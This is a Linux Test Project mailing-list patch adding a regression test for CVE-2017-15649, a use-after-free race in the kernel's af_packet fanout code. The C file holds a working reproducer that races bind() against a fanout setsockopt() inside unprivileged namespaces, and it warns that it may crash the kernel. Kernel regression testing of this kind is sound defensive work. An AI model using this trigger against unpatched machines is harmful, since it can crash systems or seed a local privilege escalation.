From: Michael Moese <mmoese@suse.de>
Date: Wed, 29 Jan 2020 13:02:31 +0100
Subject: [LTP] [PATCH v2] Add a regression test for cve-2017-15649
Message-ID: <20200129120231.17375-1-mmoese@suse.de>
List-Id: <ltp.lists.linux.it>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: ltp@lists.linux.it

net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local
users to gain privileges via crafted system calls that trigger
mishandling of packet_fanout data structures, because of a race
condition (involving fanout_add and packet_do_bind) that leads to a
use-after-free.

See https://ssd-disclosure.com/archives/3484 for more detail.

Signed-off-by: Michael Moese <mmoese@suse.de>

--
Changes to v1:
  - reworked the usage of fuzzy sync library so this should now be
    correct
  - use LTP library functions for file I/O
  - require KASAN to be enabled
---
 runtest/cve                    |   2 +-
 testcases/cve/.gitignore       |   1 +
 testcases/cve/Makefile         |   1 +
 testcases/cve/cve-2017-15649.c | 135 +++++++++++++++++++++++++++++++++
 4 files changed, 138 insertions(+), 1 deletion(-)
 create mode 100644 testcases/cve/cve-2017-15649.c

diff --git a/runtest/cve b/runtest/cve
index 57cf66075..b76ddaaaa 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -24,7 +24,7 @@ cve-2017-12193 add_key04
 cve-2017-15274 add_key02
 cve-2017-15299 request_key03 -b cve-2017-15299
 cve-2017-15537 ptrace07
-cve-2017-15649 fanout01
+cve-2017-15649 cve-2017-15649
 cve-2017-15951 request_key03 -b cve-2017-15951
 cve-2017-17805 af_alg02
 cve-2017-17806 af_alg01
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index 01a3e4c8f..08154e2db 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -8,5 +8,6 @@ cve-2017-2671
 meltdown
 stack_clash
 cve-2017-17052
+cve-2017-15649
 cve-2017-16939
 cve-2017-17053
diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
index da44fff60..6cf3b5af9 100644
--- a/testcases/cve/Makefile
+++ b/testcases/cve/Makefile
@@ -46,5 +46,6 @@ cve-2017-17052:	CFLAGS += -pthread
 cve-2017-17053:	CFLAGS += -pthread
 
 cve-2015-3290:	CFLAGS += -pthread
+cve-2017-15649: CFLAGS += -pthread
 
 include $(top_srcdir)/include/mk/generic_leaf_target.mk
diff --git a/testcases/cve/cve-2017-15649.c b/testcases/cve/cve-2017-15649.c
new file mode 100644
index 000000000..11ade5cd5
--- /dev/null
+++ b/testcases/cve/cve-2017-15649.c
@@ -0,0 +1,135 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ *   Copyright (c) 2019 Michael Moese <mmoese@suse.com>
+ */
+/* Regression test for CVE-2017-15649
+ * based on the reproducer at https://ssd-disclosure.com/archives/3484
+ *
+ * net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local users
+ * to gain privileges via crafted system calls that trigger mishandling of
+ * packet_fanout data structures, because of a race condition (involving
+ * fanout_add and packet_do_bind) that leads to a use-after-free.
+ *
+ * Be careful! This test may crash your kernel!
+ */
+
+#include <pthread.h>
+#include <stdio.h>
+#include <sched.h>
+#include <string.h>
+#include <time.h>
+#include <net/if.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include "tst_test.h"
+#include "tst_taint.h"
+#include "tst_safe_pthread.h"
+#include "tst_fuzzy_sync.h"
+#include "tst_capability.h"
+#include "lapi/syscalls.h"
+
+static struct tst_fzsync_pair fzsync_pair;
+
+static int fd;
+static struct ifreq ifr;
+
+struct sockaddr_ll {
+	unsigned short	sll_family;
+	short		sll_protocol;
+	int		sll_ifindex;
+	unsigned short	sll_hatype;
+	unsigned char	sll_pkttype;
+	unsigned char	sll_halen;
+	unsigned char	sll_addr[8];
+};
+static struct sockaddr_ll addr;
+
+void *bind_fn(void *unused)
+{
+	while (tst_fzsync_run_b(&fzsync_pair)) {
+		tst_fzsync_start_race_b(&fzsync_pair);
+		bind(fd, (struct sockaddr *)&addr, sizeof(addr));
+		tst_fzsync_end_race_b(&fzsync_pair);
+	}
+	return unused;
+}
+
+static void setup(void)
+{
+	int real_uid = getuid();
+	int real_gid = getgid();
+	int index;
+
+	tst_fzsync_pair_init(&fzsync_pair);
+	tst_taint_init(TST_TAINT_W | TST_TAINT_D | TST_TAINT_L);
+
+	if (unshare(CLONE_NEWUSER) != 0)
+		tst_brk(TBROK | TTERRNO, "unshare(CLONE_NEWUSER) failed");
+
+	if (unshare(CLONE_NEWNET) != 0)
+		tst_brk(TBROK | TTERRNO, "unshare(CLONE_NEWUSER) failed");
+
+	SAFE_FILE_PRINTF("/proc/self/setgroups", "deny");
+	SAFE_FILE_PRINTF("/proc/self/uid_map", "0 %d 1\n", real_uid);
+	SAFE_FILE_PRINTF("/proc/self/gid_map", "0 %d 1\n", real_gid);
+
+	fd = SAFE_SOCKET(AF_PACKET, SOCK_RAW, PF_PACKET);
+
+	strcpy((char *) &ifr.ifr_name, "lo");
+	SAFE_IOCTL(fd, SIOCGIFINDEX, &ifr);
+	index = ifr.ifr_ifindex;
+
+	SAFE_IOCTL(fd, SIOCGIFFLAGS, &ifr);
+	ifr.ifr_flags &= ~(short) IFF_UP;
+
+	SAFE_IOCTL(fd, SIOCSIFFLAGS, &ifr);
+
+	addr.sll_family = AF_PACKET;
+	addr.sll_protocol = 0x0;
+	addr.sll_ifindex = index;
+}
+
+static void cleanup(void)
+{
+	tst_fzsync_pair_cleanup(&fzsync_pair);
+	SAFE_CLOSE(fd);
+}
+
+static void run(void)
+{
+	int fanout = 0x3;
+
+	tst_fzsync_pair_reset(&fzsync_pair, bind_fn);
+
+	while (tst_fzsync_run_a(&fzsync_pair)) {
+		tst_fzsync_start_race_a(&fzsync_pair);
+		setsockopt(fd, 0x107, 18, &fanout, sizeof(fanout));
+		tst_fzsync_end_race_a(&fzsync_pair);
+	}
+
+	tst_res(TPASS, "please check for KASAN output");
+}
+
+
+static const char *kconfigs[] = {
+	"CONFIG_KASAN",
+	"CONFIG_USER_NS",
+	NULL
+};
+
+static struct tst_cap caps[] = {
+	TST_CAP(TST_CAP_REQ, CAP_SYS_ADMIN),
+	TST_CAP(TST_CAP_REQ, CAP_NET_RAW),
+	TST_CAP(TST_CAP_DROP, CAP_SYS_ADMIN),
+	{},
+};
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.cleanup = cleanup,
+	.needs_kconfigs = kconfigs,
+	.caps = caps
+};
-- 
2.25.0

